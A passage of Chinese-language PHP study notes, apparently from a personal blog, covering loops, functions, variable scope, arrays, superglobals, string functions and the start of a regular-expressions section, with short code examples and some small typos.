<h4 id="二、、循环语句"><a href="#二、、循环语句" class="headerlink" title="二、、循环语句"></a>二、、循环语句</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">重复执行某些操作</span><br><span class="line"></span><br><span class="line">while</span><br><span class="line">do...while</span><br><span class="line">for</span><br><span class="line"></span><br><span class="line">while循环</span><br><span class="line">	while(表达式)&#123;</span><br><span class="line">		语句... 再自加一</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">do...while循环</span><br><span class="line">	do&#123;</span><br><span class="line">		语句...</span><br><span class="line">	&#125;while(表达式)</span><br><span class="line"></span><br><span class="line">for循环</span><br><span class="line">	for(表达式1,表达式2,表达式3)&#123;</span><br><span class="line">		语句...</span><br><span class="line">	&#125;</span><br><span class="line">	表达式1:会放一些初始化的语句，$a&#x3D;0,</span><br><span class="line">	表达式2:循环次数，一般用比较操作符来判断操作次数，a&lt;&#x3D;5</span><br><span class="line">	表达式3:自增1，每次循环完毕都自身加1, a++</span><br></pre></td></tr></table></figure>

<h4 id="特殊的流程控制语句"><a href="#特殊的流程控制语句" class="headerlink" title="特殊的流程控制语句"></a>特殊的流程控制语句</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、break语句</span><br><span class="line">	退出循环	break 后面可以接上数字表示跳出几层循环，break 2 表示跳出两层循环</span><br><span class="line">2、continue语句</span><br><span class="line">	跳过本次循环</span><br><span class="line">3、exit()语句</span><br><span class="line">	结束整个程序的执行</span><br></pre></td></tr></table></figure>

<h4 id="三、函数"><a href="#三、函数" class="headerlink" title="三、函数"></a>三、函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用函数的优点</span><br><span class="line">	提高软件的可维护性</span><br><span class="line">	提高软件的开发效率</span><br><span class="line">	提高软件的重用性</span><br><span class="line">	</span><br><span class="line">函数的创建和调用</span><br><span class="line">	&#x2F;&#x2F;创建一个fun函数，函数内部输出内容Hello</span><br><span class="line">    function fun()&#123;</span><br><span class="line">        echo &#39;Hello&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;调用函数，函数名后面需要加括号</span><br><span class="line">    fun();</span><br><span class="line">	</span><br><span class="line">一、自定义函数</span><br><span class="line">	1、函数的定义</span><br><span class="line">	function 函数名([参数1，参数2,....])&#123;</span><br><span class="line">	return 表达式;&#x2F;&#x2F;可以从函数中返回一个值，也可以不返回</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	2、函数的调用</span><br><span class="line">	不管是自己定义的函数还是系统提供的函数，如果函数不被调用就不会执行！</span><br><span class="line">	调用：函数被调用后开始执行函数体中代码，执行的过程是相对独立的，执行完毕返回调用的位置继	续向下执行</span><br><span class="line">	</span><br><span class="line">	3、函数的参数</span><br><span class="line">	形式参数由零个、一个或者多个变量组成。</span><br><span class="line">	实际参数由零个、一个或者多个参数组成，每个参数是一个表达式，用逗号分隔</span><br><span class="line">	</span><br><span class="line">	4、函数的返回值</span><br><span class="line">	函数的返回值是是将函数执行后的结果返回给调用者</span><br><span class="line">	默认如果不写返回则函数的返回值为NULL</span><br><span class="line">	</span><br><span class="line">二、变量的范围</span><br><span class="line">	1、局部变量</span><br><span class="line">	        function fun()&#123;</span><br><span class="line">            echo $i;</span><br><span class="line">            $a&#x3D;1;	&#x2F;&#x2F;局部变量</span><br><span class="line">            &#125;</span><br><span class="line">		局部变量也称为内部变量，局部变量实在函数内定义的，作用域仅限于函数的内部。</span><br><span class="line">	</span><br><span class="line">		</span><br><span class="line">	2、全局变量</span><br><span class="line">			$i&#x3D;10;	&#x2F;&#x2F;全局变量</span><br><span class="line">            function fun()&#123;</span><br><span class="line">                global $i;	&#x2F;&#x2F;声明$i为全局变量，然后在这个函数内部就可以使用$i</span><br><span class="line">                echo $i;</span><br><span class="line">                $a&#x3D;1;	</span><br><span class="line">            &#125;</span><br><span class="line">            fun();</span><br><span class="line">		全局变量也被称为外部变量，在函数的外部定义的，作用域从定义处到程序文件的末尾</span><br><span class="line">		在PHP函数中无法直接使用全局变量，如需使用必须使用global声明变量</span><br><span class="line">	3、静态变量</span><br><span class="line">	        function fun()&#123;</span><br><span class="line">            static $a&#x3D;1;	&#x2F;&#x2F;静态变量$a,初始化静态变量，仅在第一次调用的时候执行</span><br><span class="line">            echo ++$a;	&#x2F;&#x2F;当第二次执行这个函数的时候$a这个变量依然存在并且里面的值也依然							存在</span><br><span class="line">            &#125;</span><br><span class="line">            fun();</span><br><span class="line">            echo &#39;&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">            fun();</span><br><span class="line">		静态变量的是值在函数内部定义的时候static关键字来定义变量特点：函数执行完毕之后变量			不会立即消失，再次调用函数的时候，静态变量保存的值依然存在，并且仅在第一次执行				函数的时候会初始化值</span><br></pre></td></tr></table></figure>

<h4 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一、函数的传递</span><br><span class="line">	1、案值传递参数</span><br><span class="line">		默认的，我们在传递参数的时候默认使用的就是这个方式！</span><br><span class="line">		对形式参数的操作，根本不会影响到实际参数的值两者相当于没有联系</span><br><span class="line">		function fun($a)&#123;</span><br><span class="line">            echo ++$a;</span><br><span class="line">        &#125;</span><br><span class="line">        $i &#x3D; 10;</span><br><span class="line">        fun($i);	&#x2F;&#x2F; 打印结果 11</span><br><span class="line">        echo &#39;&lt;br &#x2F;&gt;&#39;,$i;	&#x2F;&#x2F; 打印结果10</span><br><span class="line">	2、按引用传递参数</span><br><span class="line">		按引用传递参数，相当于形式参数和实际参数是同一个值，只是名字不一样，相当于起了个别名</span><br><span class="line">		对于形式参数的操作会直接影响到实际参数</span><br><span class="line">		function fun(&amp;$a)&#123;</span><br><span class="line">            echo ++$a;</span><br><span class="line">        &#125;</span><br><span class="line">        $i &#x3D; 10;</span><br><span class="line">        fun($i);	&#x2F;&#x2F; 打印结果11</span><br><span class="line">        echo &#39;&lt;br &#x2F;&gt;&#39;, $i;	&#x2F;&#x2F; 打印结果11</span><br><span class="line">	3、函数的默认参数</span><br><span class="line">		可以给形式参数设置默认值，设置发方法直接赋值即可</span><br><span class="line">		给形式参数加默认值的时候是从右往左加，右边的必须有，才能给左边的加，</span><br><span class="line">		右边必须加的值就是默认值</span><br><span class="line">		&#x2F;&#x2F; $b&#x3D;10就是默认值</span><br><span class="line">		function fun($a,$b&#x3D;10)&#123;</span><br><span class="line">            echo $a+$b;</span><br><span class="line">        &#125;</span><br><span class="line">        fun(20);		</span><br><span class="line">	4、可变长度参数列表</span><br><span class="line">		PHP提供了三个函数，可以直接使用</span><br><span class="line">		func_get_args();</span><br><span class="line">		func_get_arg();</span><br><span class="line">		func_num_args();</span><br><span class="line">		这三个函数可以使用在自定义函数内部，能够给我们返回一些关于参数的信息</span><br><span class="line">		function test()&#123;</span><br><span class="line">        &#x2F;&#x2F;	var_dump(func_get_args());	&#x2F;&#x2F;做一些其他操作</span><br><span class="line">        &#x2F;&#x2F;	var_dump(func_get_arg(1));	&#x2F;&#x2F;调用这个函数的时候可以传入一个值表示获取第												几个实际参数(从0开始)，感觉类似索引</span><br><span class="line">            var_dump(func_num_args());	&#x2F;&#x2F;返回传入所在自定义函数的参数的个数，</span><br><span class="line">            								类似于	数据库的，length</span><br><span class="line">        &#125;</span><br><span class="line">        test(2313,135165,165165,&#39;uiashdinsauiod&#39;);	&#x2F;&#x2F; 自定义函数参数个数</span><br></pre></td></tr></table></figure>

<h4 id="四、可变函数"><a href="#四、可变函数" class="headerlink" title="四、可变函数"></a>四、可变函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">就是把一个函数赋值给变量</span><br><span class="line">function test()&#123;</span><br><span class="line">	echo &#39;我是TEST函数&#39;;</span><br><span class="line">&#125;</span><br><span class="line">$a  &#x3D; &#39;test&#39;;	&#x2F;&#x2F; $a &#x3D; test();</span><br><span class="line">echo $a();		&#x2F;&#x2F; echo a;	&#x2F;&#x2F;这种也能输出，但不知道后续有什么问题</span><br></pre></td></tr></table></figure>

<h4 id="五、递归函数"><a href="#五、递归函数" class="headerlink" title="五、递归函数"></a>五、递归函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">递归函数即在函数内部自己调用自己的函数.</span><br><span class="line">递归函数:</span><br><span class="line">    1)函数在被调用的执行过程中会在内存里面分配空间用于存储临时数据，函数在执行过程中默认之间	 没有任何联系，除了(静态变量，接引用传，全局变量),里面的变量默认都是局部变量</span><br><span class="line">    2)递归函数，在函数的内部需要有适时结束函数运行的条件</span><br><span class="line">在使用递归的时候避免死循环</span><br><span class="line">function fun($i)&#123;</span><br><span class="line">	echo $i.&#39;&amp;nbsp;&#39;;</span><br><span class="line">	if($i&gt;0)&#123;</span><br><span class="line">		fun($i-1);	&#x2F;&#x2F; 自己内部调用自己，即 递归函数</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		echo &#39;&lt;- - -&gt;&#39;;</span><br><span class="line">	&#125;</span><br><span class="line">	echo $i.&#39;&amp;nbsp;&#39;;</span><br><span class="line"> &#125;</span><br><span class="line"> &#x2F;&#x2F; </span><br><span class="line"> fun(3);&#x2F;&#x2F;返回结果是 3 2 1 0 &lt;- - -&gt;0 1 2 3</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1582385640406.png" alt="1582356332678"></p>
<h4 id="六、内置函数"><a href="#六、内置函数" class="headerlink" title="六、内置函数"></a>六、内置函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PHP提供给我们许多现成的函数或者结构，我们可以在实际的开发中直接使用</span><br><span class="line">使用函数使用来完成功能的，说白了，有这样的需求，才会找对应的函数！</span><br></pre></td></tr></table></figure>

<h4 id="理解数组和创建数组"><a href="#理解数组和创建数组" class="headerlink" title="理解数组和创建数组"></a>理解数组和创建数组</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">思路</span><br><span class="line">    数组概论:</span><br><span class="line">        可以把这些单个数据都联合起来(打包、捆绑)起来，作为一个整体</span><br><span class="line">            这个数据类型就是  数组 他是一种 复合数据类型</span><br><span class="line"></span><br><span class="line">    数组类型：</span><br><span class="line">        索引值:将相当于给里面的每一个数据起个名字</span><br><span class="line">        名字如果取得是整型：那么这个数组就是索引数组</span><br><span class="line">        如果名字是字符串类：那么这个数组就是  关联数组</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1582519884665.png" alt="1582381577238"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数组创建:</span><br><span class="line">PHP中创建数组非常灵活，与其他许多编程语言不同的是PHP不需要在创建数组时，指定数组的大小(指定数组里面可以放几个数据)，甚至不需要在使用数组之前声明，也可以在同一个数组中存放任何了型的数据。</span><br><span class="line">	· 直接为元素赋值即可创建数组</span><br><span class="line">	· 使用array()语言结构创建数组</span><br><span class="line">1、直接为数组元素赋值创建数组</span><br><span class="line">	$变量名[索引值]&#x3D;数据内容;</span><br><span class="line">		索引值可以是整数也可以是字符串，也可以不写(默认为索引数组)</span><br><span class="line">		如果省略索引值不写那么默认索引值就是整数，并且从0开始，依次向上</span><br><span class="line">		&#x2F;&#x2F; $student[索引值]&#x3D;数据值;					不加索引值从0开始依次向上</span><br><span class="line">		$student[0]&#x3D;10;			  $student[]&#x3D;10;		  &#x2F;&#x2F; 0</span><br><span class="line">        $student[1]&#x3D;&#39;孙悟空&#39;;		$student[]&#x3D;&#39;孙悟空&#39;;	  &#x2F;&#x2F; 1</span><br><span class="line">        $student[2]&#x3D;true;		  $student[]&#x3D;true;		  &#x2F;&#x2F; 2</span><br><span class="line">        $student[3]&#x3D;60.5;		  $student[]&#x3D;60.5;	  	  &#x2F;&#x2F; 3</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 使用echo并不能输出数组，而是需要使用print_r()函数来输出打印数组</span><br><span class="line">        &#x2F;&#x2F;echo $student;</span><br><span class="line"></span><br><span class="line">        print_r($student);</span><br><span class="line">        &#x2F;&#x2F; 使用var_dump也可以输出，并且打印数据类型</span><br><span class="line">        &#x2F;&#x2F;var_dump($student);</span><br><span class="line">				</span><br><span class="line">2、使用array()结构创建数组</span><br><span class="line">	$变量名&#x3D;array(key1&#x3D;&gt;value1......);</span><br><span class="line">	创建数组</span><br><span class="line">        $student&#x3D;array(		|	&#x2F;&#x2F;可以不写索引值直接输出</span><br><span class="line">        &#39;sum&#39;&#x3D;&gt;10,			|	$student&#x3D;array(10,&#39;孙悟空&#39;,true,60.5)	</span><br><span class="line">        &#39;name&#39;&#x3D;&gt;&#39;孙悟空&#39;,	  |</span><br><span class="line">        &#39;sex&#39;&#x3D;&gt;true,		|</span><br><span class="line">        &#39;grade&#39;&#x3D;&gt;60.5		|</span><br><span class="line">        );					|</span><br><span class="line">        &#x2F;&#x2F;print_r($student);|</span><br><span class="line">        var_dump($student); |</span><br><span class="line">        </span><br><span class="line">使用数组里面的具体数据</span><br><span class="line">数组变量名称[索引值]</span><br><span class="line">$student&#x3D;array(</span><br><span class="line">&#39;sum&#39;&#x3D;&gt;10,</span><br><span class="line">&#39;name&#39;&#x3D;&gt;&#39;孙悟空&#39;,</span><br><span class="line">&#39;sex&#39;&#x3D;&gt;true,</span><br><span class="line">&#39;grade&#39;&#x3D;&gt;60.5</span><br><span class="line">);</span><br><span class="line">echo $student[&#39;name&#39;];	&#x2F;&#x2F; 数组[索引值]，输出结果&#39;孙悟空&#39;</span><br><span class="line"></span><br><span class="line">数组中还可以放数组</span><br><span class="line"></span><br><span class="line">二维数组</span><br><span class="line">$student&#x3D;array(</span><br><span class="line">	array(1,&#39;孙悟空&#39;,true,60.5),</span><br><span class="line">	array(2,&#39;唐玄奘&#39;,true,100),</span><br><span class="line">	array(3,&#39;沙和尚&#39;,true,80.5),</span><br><span class="line">	array(4,&#39;猪八戒&#39;,true,0),</span><br><span class="line">);</span><br><span class="line">print_r($student);</span><br><span class="line">二维数组如果需要调用其中的一个值</span><br><span class="line">$student&#x3D;array(</span><br><span class="line">	array(1,&#39;孙悟空&#39;,true,60.5),</span><br><span class="line">	array(2,&#39;唐玄奘&#39;,true,100),</span><br><span class="line">	array(3,&#39;沙和尚&#39;,true,80.5),</span><br><span class="line">	array(4,&#39;猪八戒&#39;,true,0),</span><br><span class="line">);</span><br><span class="line">&#x2F;&#x2F; 0表示从第0个开始也就是从孙悟空那个数组开始，</span><br><span class="line">&#x2F;&#x2F; 3表示第0个数组里面索引是3的值</span><br><span class="line">echo $student[0][3];</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1582522025507.png" alt="1582385640406"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数组的遍历</span><br><span class="line">	遍历:每个都经历一遍</span><br><span class="line">	1) for循环</span><br><span class="line">		用的少，因为有缺陷，不能用于关联数组进行遍历</span><br><span class="line">	2) foreach语句来实现遍历数组的目的，比较常用，专门用来遍历数组的</span><br><span class="line">		foreach(数组变量名 as 变量1)&#123;</span><br><span class="line">			每次循环执行的语句</span><br><span class="line">			变量1代表当前正在经历的数据</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">不管是关联数组还是一维数组二维数组，都可以输出</span><br><span class="line">		实例:</span><br><span class="line">			$arr1 &#x3D; array(</span><br><span class="line">            &#39;name&#39;&#x3D;&gt;&#39;孙悟空&#39;,</span><br><span class="line">            &#39;num&#39;&#x3D;&gt;10</span><br><span class="line">            );</span><br><span class="line">            foreach($arr1 as $value)&#123;</span><br><span class="line">                echo $value;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">如果你想要的知道索引值</span><br><span class="line">如果想要知道索引值必须加&#x3D;&gt;符号，前面的变量是索引值，后面的变量是执行的数据</span><br><span class="line">	$arr1 &#x3D; array(</span><br><span class="line">    &#39;name&#39;&#x3D;&gt;&#39;孙悟空&#39;,</span><br><span class="line">   	&#39;num&#39;&#x3D;&gt;10</span><br><span class="line">     );</span><br><span class="line">     foreach($arr1 as $w&#x3D;&gt;$value)&#123;</span><br><span class="line">        echo $w,$value.&#39;&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">预定义超全局数组变量</span><br><span class="line">	已经定义好了(存在)的变量(存放的数据的类型是数组 )</span><br><span class="line">	超全局:超级全局变量，作用域(有效区域)全局的，并不需要global来定义</span><br><span class="line">	</span><br><span class="line">	传递数据(提供数据)给服务器端主要的两种方式</span><br><span class="line">	1.get方式</span><br><span class="line">		比如:</span><br><span class="line">										&#x2F;&#x2F;其中&amp;表示后面可以追加多个值		</span><br><span class="line">										?id&#x3D;10&amp;name&#x3D;SunWuKong</span><br><span class="line">			http:&#x2F;&#x2F;localhost&#x2F;demo2&#x2F;1.php?参数名&#x3D;参数值</span><br><span class="line">			在服务器端(请求的PHP文件这边)可以通过$_GET来获取到</span><br><span class="line">			$_GET就是在服务端的参数名字，而在URL中的索引值对应的数据就是参数值</span><br><span class="line">		在服务端使用$_GET:			</span><br><span class="line">					var_dump($_GET);</span><br><span class="line">	$_GET优缺点</span><br><span class="line">    	优点:</span><br><span class="line">    		实行方便，直接在URL中使用</span><br><span class="line">    	缺点:</span><br><span class="line">    		正因为实行方便，直接写在URL中，所以这反而不安全，而且在URL中只能用英文</span><br><span class="line">    		</span><br><span class="line">	2.post方式</span><br><span class="line">	$_POST</span><br><span class="line">	</span><br><span class="line">	&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">		&lt;title&gt;预定义全局变量&lt;&#x2F;title&gt;</span><br><span class="line">	&lt;&#x2F;head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">	&lt;from method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">		姓名:&lt;input type&#x3D;&quot;text&quot; name&#x3D;&#39;username&#39; &#x2F;&gt;&lt;br &#x2F;&gt;</span><br><span class="line">		性别:&lt;input type&#x3D;&quot;text&quot; name&#x3D;&#39;sex&#39; &#x2F;&gt;&lt;br &#x2F;&gt;</span><br><span class="line">	&lt;&#x2F;from&gt;</span><br><span class="line">	&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">处理数组的相关函数</span><br><span class="line">这只是其中一部分，通过学习下面一部分，来了解如何使用处理数组的相关函数</span><br><span class="line">	1) array_count_values	&#x2F;&#x2F; 统计数组中所有的值出现的次数</span><br><span class="line">			array array_count_values(array $input)</span><br><span class="line">				实例:</span><br><span class="line">					$array &#x3D; array(1,&quot;hello&quot;,1,&quot;world&quot;,&quot;hello&quot;);</span><br><span class="line">					print_r(array_count_values ($array));</span><br><span class="line">					print_r($array) &#x2F;&#x2F; 原来的数组不会受到任何影响</span><br><span class="line">				结果:</span><br><span class="line">				&#x2F;&#x2F; 1 在数组中出现了2次，hello出现了2 次，world出现了1次</span><br><span class="line">					Array ( [1]&#x3D;&gt;2 [hello]&#x3D;&gt;2 [world]&#x3D;&gt;1 )</span><br><span class="line"></span><br><span class="line">	2) array_key_exists	&#x2F;&#x2F; 查看给定的键值或索引是否存在与数组中</span><br><span class="line">				实例:</span><br><span class="line">                    $search_array &#x3D; array(&#39;first&#39; &#x3D;&gt; 1 , &#39;second&#39; &#x3D;&gt; 4);</span><br><span class="line">                    if(array_key_exists(&#39;first&#39;,$search_array))&#123;</span><br><span class="line">                            echo &quot;The &#39;first&#39; element is in the array&quot;;</span><br><span class="line">                    &#125;</span><br><span class="line">                结果:</span><br><span class="line">                	The &#39;first&#39; element is in the array</span><br><span class="line">		</span><br><span class="line">	3) array_search		&#x2F;&#x2F;在数组中搜索给定的值，如果成功则返回相应的键名</span><br><span class="line">		   $array &#x3D; array(0 &#x3D;&gt; &#39;blue&#39;, 1 &#x3D;&gt; &#39;red&#39;,2 &#x3D;&gt;&#39;green&#39;,3&#x3D;&gt;&#39;red&#39;,4&#x3D;&gt;15);</span><br><span class="line">		   &#x2F;&#x2F; 可以加入true来判断中&#39;15&#39;有没有,虽然上面有15但是类型不同,一个int一个str</span><br><span class="line">		   &#x2F;&#x2F; 如果不加true不比较类型，只比较大小是够相等，返回了键4</span><br><span class="line">           var_dump(array_search(&#39;15&#39;,$array,true)); &#x2F;&#x2F; key &#x3D; 2  返回false,类型不同</span><br><span class="line"> 		   var_dump(array_search(&#39;red&#39;,$array));	 &#x2F;&#x2F; key &#x3D; 1</span><br><span class="line"></span><br><span class="line">	4) count	&#x2F;&#x2F; 计算数组中的单元数目或对象中的属性个数</span><br><span class="line">		&#x2F;&#x2F; $array变量中有两个值</span><br><span class="line">		$array &#x3D; array(0 &#x3D;&gt; &#39;blue&#39;, 1 &#x3D;&gt; &#39;red&#39;);</span><br><span class="line">		var_dump(count($array));	&#x2F;&#x2F; 返回结果是 int(2)</span><br><span class="line">		</span><br><span class="line">	5) in_array		&#x2F;&#x2F; 检查数组中是否存在某个值</span><br><span class="line">		$os &#x3D; array(&#39;Mac&#39;,&#39;NT&#39;,&#39;Irix&#39;,&#39;Linux&#39;);</span><br><span class="line">		var_dump(in_array(&#39;Mac&#39;,$os));</span><br><span class="line"></span><br><span class="line">	6) list		&#x2F;&#x2F; 把数组中的值赋给一些变量</span><br><span class="line">		list()仅能用于数字索引的数组</span><br><span class="line">		格式:</span><br><span class="line">			$arr&#x3D;array(索引值);</span><br><span class="line">            list(变量名)&#x3D;$arr;</span><br><span class="line">            echo 变量名 ;</span><br><span class="line">		</span><br><span class="line">		实例:</span><br><span class="line">            $arr&#x3D;array(60,70,80);</span><br><span class="line">            list($Sun,$Liu,$Zhang)&#x3D;$arr;</span><br><span class="line">            echo $Zhang;	&#x2F;&#x2F; 结果是 80</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">	7) asort	&#x2F;&#x2F; 对数组进行排序保持索引关系</span><br><span class="line">		$frults &#x3D; array(&quot;c&quot;&#x3D;&gt;60,&quot;a&quot;&#x3D;&gt;90,&quot;b&quot;&#x3D;&gt;30);</span><br><span class="line">		asort($frults);</span><br><span class="line">		print_r($frults);</span><br><span class="line">		直接对数组里面的数据进行排序</span><br></pre></td></tr></table></figure>

<h4 id="字符串处理"><a href="#字符串处理" class="headerlink" title="字符串处理"></a>字符串处理</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一、去除空格或其他字符</span><br><span class="line">1、trim()函数</span><br><span class="line">	去除空格</span><br><span class="line">		$str &#x3D;&#39;     abc      &#39;;</span><br><span class="line">        var_dump($str);</span><br><span class="line">        var_dump(trim($str));</span><br><span class="line">    去除其他空格</span><br><span class="line">    	$str &#x3D;&#39;aabca&#39;;</span><br><span class="line">        var_dump($str);</span><br><span class="line">        var_dump(trim($str,&#39;a&#39;));</span><br><span class="line">2、ltrim()	去除左边字符</span><br><span class="line">3、rtrim()	去除右边字符</span><br><span class="line"></span><br><span class="line">二、大小写转换函数</span><br><span class="line">1、strtoupper()</span><br><span class="line">	将字母大写</span><br><span class="line">		$a &#x3D; &#39;test&#39;;</span><br><span class="line">        var_dump($a);</span><br><span class="line">        var_dump(strtoupper($a));</span><br><span class="line">2、strtolower()</span><br><span class="line">	方法同上</span><br><span class="line">	</span><br><span class="line">三、字符串查找函数</span><br><span class="line">1、substr_count()</span><br><span class="line">	计算字符串出现的次数</span><br><span class="line">		$str&#x3D;&#39;teteastetasd&#39;;</span><br><span class="line">		var_dump(substr_count($str,&#39;te&#39;));	&#x2F;&#x2F;可以再查找的字符串后面加上起始值和结束值</span><br><span class="line">2、strpos()</span><br><span class="line">	查找字符串首次出现的位置</span><br><span class="line">		$str&#x3D;&#39;teteastetasd&#39;;</span><br><span class="line">		var_dump(strpos($str,&#39;as&#39;));	&#x2F;&#x2F;返会结果是 4</span><br><span class="line">3、strstr()</span><br><span class="line">	返回字符串首次出现的位置并将后面的字符全部输出</span><br><span class="line">		$str&#x3D;&#39;teteastetasd&#39;;</span><br><span class="line">		var_dump(strpos($str,&#39;as&#39;));	&#x2F;&#x2F;返回结果 astetasd</span><br><span class="line">四、字符串替换函数 </span><br><span class="line">1、str_replace</span><br><span class="line">	字符串替换</span><br><span class="line">		替换多个字符</span><br><span class="line">		$str&#x3D;&#39;teteastetasd&#39;;</span><br><span class="line">		$str1&#x3D;str_replace(array(&#39;e&#39;,&#39;a&#39;,&#39;s&#39;),array(&#39;E&#39;,&#39;A&#39;,&#39;S&#39;),$str);</span><br><span class="line">		var_dump($str1);</span><br><span class="line">五、与html标签相关的函数</span><br><span class="line">1、htmlspecialchars()</span><br><span class="line">	$str&#x3D;&lt;&lt;&lt;START</span><br><span class="line">    &lt;p style&#x3D;&quot;color:red;fonts-size:28px;&quot;&gt;单位确定为取得完全&lt;&#x2F;p&gt;</span><br><span class="line">    START;</span><br><span class="line">    echo $str;</span><br><span class="line">    echo &quot;\n&quot;;</span><br><span class="line">    echo htmlspecialchars($str);</span><br><span class="line">2、strip_tags()</span><br><span class="line">	从字符串中去除HTML和PHP标记</span><br><span class="line">		$str&#x3D;&lt;&lt;&lt;START</span><br><span class="line">        &lt;p style&#x3D;&quot;color:red;fonts-size:28px;&quot;&gt;单位确定为取得完全&lt;&#x2F;p&gt;</span><br><span class="line">        START;</span><br><span class="line">        echo $str;</span><br><span class="line">        echo &quot;\n&quot;;</span><br><span class="line">        echo strip_tags($str);</span><br><span class="line">六、字符串截取函数</span><br><span class="line">1、substr()</span><br><span class="line">	截取函数</span><br><span class="line">		$str&#x3D;&#39;teaeatewfsdf&#39;;</span><br><span class="line">		echo substr($str,1);	&#x2F;&#x2F;将t给截取了</span><br><span class="line">七、字符串分割函数</span><br><span class="line">1、explode()</span><br><span class="line">	用其中的一个字符来分割</span><br><span class="line">		$str&#x3D;&#39;test,test1,test2,test3&#39;;</span><br><span class="line">		var_dump(explode(&#39;,&#39;,$str));</span><br><span class="line">2、str_split() </span><br><span class="line">	将一个字符串转换为数组</span><br><span class="line">		$str &#x3D; &#39;Hello&#39;;</span><br><span class="line">		var_dump(str_split($str));	&#x2F;&#x2F;输出结果是 数组格式</span><br><span class="line">	将字符中长度是3的输出，这里输出的结果就是hel   lo是因为字符长度不足，输出出来的。</span><br><span class="line">		$str &#x3D; &#39;Hello&#39;;</span><br><span class="line">		var_dump(str_split($str,3));</span><br></pre></td></tr></table></figure>

<h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一、正则表达式语法规则</span><br><span class="line">	正则表达式描述了一类字符串的特征，通过这个特征与特定的函数配合，对其他的字符串进行匹配、查找、替换及分割操作！</span><br><span class="line">	</span><br><span class="line">	这类字符串的特征是由一个或多个</span><br><span class="line">		1、普通字符(比如a到z)、</span><br><span class="line">		2、元字符(有特殊功能的字符比如*、+、?等),</span><br><span class="line">		组成的一个字符串！</span><br><span class="line">		例如&#39;&#x2F;a&#x2F;&#39;,a就是普通字符，&#x2F;是定界符(表示正则表达式开始或结束)。</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">preg_match_all()&#x2F;&#x2F;按指定的正则表达式，在给定的字符串中进行搜索，匹配到复合特征的部分取出来</span><br><span class="line">&#x2F;&#x2F; 用正则表达式指定一个特征</span><br><span class="line">	$pattern&#x3D;&#39;&#x2F;test&#x2F;&#39;;</span><br><span class="line">&#x2F;&#x2F; 新建一个变量，里面存入字符串，上面的特种会查找当前字符串有没有相同的，有则输出</span><br><span class="line">    $str&#x3D;&#39;testidhiashtestewofoitest&#39;;</span><br><span class="line">&#x2F;&#x2F; 第一个变量就是指定得正则，第二个变量就是要查找的字符串，第三个变量是将你匹配的字符串查找出来，并且赋值给第三个变量</span><br><span class="line">    preg_match_all($pattern,$str,$varr);</span><br><span class="line">    var_dump(preg_match_all($pattern,$str,$varr));</span><br><span class="line">    var_dump($varr);</span><br><span class="line"></span><br><span class="line">二、定界符</span><br><span class="line">	我们一般用正斜杠&#x2F;作为定界符的字符</span><br><span class="line">	除了字母、数字、和正斜线以外的字符都可以作为定界符，比如</span><br><span class="line">	#</span><br><span class="line">	!</span><br><span class="line">	&#123;&#125;</span><br><span class="line">	|</span><br><span class="line">	都可以</span><br><span class="line">	定界符放在正则表达式起始位置，前后一致！</span><br><span class="line">	</span><br><span class="line">三、普通字符</span><br><span class="line">	比如:a-z、A-Z、0-9、双引号、单引号，他们没有特殊的含义</span><br><span class="line">	</span><br><span class="line">	&#x2F;*</span><br><span class="line">	元字符</span><br><span class="line">	\d  代表0-9之中的任意一个字符，	注意是 一个 字符，如果两个的话就不行了</span><br><span class="line">	\D  匹配除了0-9之外的任意一个字符，注意是 一个 字符，如果两个的话就不行了</span><br><span class="line">	\s  匹配任意一个空白字符，比如换页符、换行符、回车符、制表符、垂直制表符</span><br><span class="line">	\S	匹配除了空白字符以外的任何一个字符</span><br><span class="line">	\w	匹配任意一个数字或字母或下划线</span><br><span class="line">	\W	匹配除数字、字母、下划线以外的任意一个字符</span><br><span class="line">	.	匹配除换行符以外的任意一个字符</span><br><span class="line">	*	匹配0次、或者1次、或多次</span><br><span class="line">	+	匹配1次或多次其前面的字符</span><br><span class="line">	?	匹配0次或1次其前面的字符</span><br><span class="line">	&#123;n&#125; 表示其前面字符恰好出现n次</span><br><span class="line">	&#123;n,&#125;	表示前面字符出现不少于n次</span><br><span class="line">	&#123;n,m&#125;	表示前面字符至少出现n次，最多出现m次</span><br><span 